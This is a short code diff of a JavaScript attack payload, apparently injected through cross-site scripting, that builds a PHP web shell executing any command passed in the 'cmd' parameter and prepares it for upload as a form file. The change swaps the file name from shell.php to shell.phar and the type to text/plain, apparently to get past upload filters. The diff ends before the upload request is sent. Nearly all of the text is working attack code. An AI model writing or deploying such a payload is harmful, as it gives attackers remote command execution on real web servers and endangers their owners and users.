@@ -1,22 +1,26 @@
 alert("Payload loaded");
 (async () => {
-  const shell = `
-  <?php
-  if (isset($_GET['cmd'])) {
-    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
-    exit;
-  }
-  ?>
-  <html>
-  <body>
-  <form method="GET">
-    <input name="cmd" style="width:70%;">
-    <input type="submit" value="Execute">
-  </form>
-  </body>
-  </html>`;
+  const content = "<?php\n" +
+    "if (isset($_GET['cmd'])) {\n" +
+    "  echo \"<pre>\";\n" +
+    "  system($_GET['cmd']);\n" +
+    "  echo \"</pre>\";\n" +
+    "  exit;\n" +
+    "}\n" +
+    "?>\n" +
+    "<!DOCTYPE html>\n" +
+    "<html>\n" +
+    "<head><title>Shell</title></head>\n" +
+    "<body style='background:#000;color:#0f0;font-family:monospace;'>\n" +
+    "<h3>Remote Shell</h3>\n" +
+    "<form method='GET'>\n" +
+    "  <input type='text' name='cmd' style='width:70%;background:#111;color:#0f0;border:1px solid #0f0;' autofocus>\n" +
+    "  <input type='submit' value='Run'>\n" +
+    "</form>\n" +
+    "</body>\n" +
+    "</html>";
 
-  const file = new File([shell], "shell.php", { type: "application/x-php" });
+  const file = new File([content], "shell.phar", { type: "text/plain" });
 
   const form = new FormData();
   form.append("localfile", file);
